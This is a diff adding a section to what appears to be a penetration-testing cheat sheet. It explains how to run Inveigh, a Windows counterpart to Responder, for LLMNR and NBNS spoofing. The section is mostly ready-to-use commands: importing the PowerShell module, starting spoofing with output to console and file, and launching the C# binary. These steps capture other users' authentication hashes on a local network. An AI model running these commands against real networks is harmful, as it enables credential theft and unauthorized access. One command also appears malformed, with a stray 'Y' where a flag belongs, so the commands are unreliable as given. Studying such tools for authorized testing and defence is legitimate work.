@@ -24,3 +24,21 @@ sudo responder -I eth0 -dwP
 -P : ProxyAuth - Force Authentication prompt
 
 -v : verbose 
+
+### How to use Inveigh
+Inveigh is the Windows Equivalent of Responder.
+#### PS Version
+Note: This version is no longer maintained!
+```powershell
+Import-Module .\Inveigh.ps1
+```
+LLMNR and NBNS Spoofing:
+```powershell
+Invoke-Inveigh Y -NBNS Y -ConsoleOutput Y -FileOutput Y
+```
+#### C# Version
+```
+.\Inveigh.exe
+```
+You can also press Esc to enter the Inveigh console while it is running.
+HELP command will give options.
